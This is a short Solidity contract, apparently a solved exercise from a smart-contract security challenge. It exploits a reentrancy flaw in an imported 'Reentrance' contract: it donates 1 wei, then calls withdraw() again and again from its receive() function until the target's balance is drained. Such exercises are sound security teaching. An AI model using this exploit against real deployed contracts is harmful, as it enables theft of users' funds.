// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        if (address(contractAddress).balance > 0) {
            Reentrance reentranceContract = Reentrance(contractAddress);
            reentranceContract.withdraw();
        }
    }

    function hackContract() external {
        // Code me!
        Reentrance reentranceContract = Reentrance(contractAddress);
        reentranceContract.donate{value: 1}(address(this));
        reentranceContract.withdraw();
    }
}
